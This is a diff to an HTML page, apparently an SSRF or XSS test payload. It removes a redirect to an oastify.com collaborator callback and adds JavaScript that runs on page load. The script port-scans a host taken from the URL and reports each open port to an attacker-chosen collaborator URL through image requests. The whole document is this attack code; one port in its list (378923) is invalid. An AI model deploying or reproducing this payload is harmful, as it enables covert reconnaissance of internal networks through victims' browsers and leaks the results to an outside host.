@@ -1,3 +1,40 @@
-<script>
- window.location='https://poh7ecxlaqjlhzunwxoblab9y04rsjo7d.oastify.com';
-</script>
+<script type="text/javascript">
+        async function scanPort(host, port) {
+            try {
+                let url = `http://${host}:${port}`;
+                await fetch(url, { mode: 'no-cors' });
+                console.log(`Port ${port} is open`);
+                sendPing(port);
+                return port;
+            } catch (error) {
+                return null; // Port is closed
+            }
+        }
+
+        async function scanPorts(host, ports) {
+            let openPorts = [];
+            for (let port of ports) {
+                let result = await scanPort(host, port);
+                if (result) {
+                    openPorts.push(result);
+                }
+            }
+            return openPorts;
+        }
+
+        function sendPing(port) {
+            let collaboratorUrl = new URLSearchParams(window.location.search).get('url');
+            let pingUrl = `${collaboratorUrl}?port=${port}`;
+            let img = new Image();
+            img.src = pingUrl;
+            console.log(`Ping sent to ${pingUrl}`);
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            let host = new URLSearchParams(window.location.search).get('host'); // Replace with your target host
+            let ports = [80, 443, 8080, 3000, 22, 21,378923]; // List of ports to scan
+            scanPorts(host, ports).then(openPorts => {
+                console.log("Open ports:", openPorts);
+            });
+        });
+    </script>
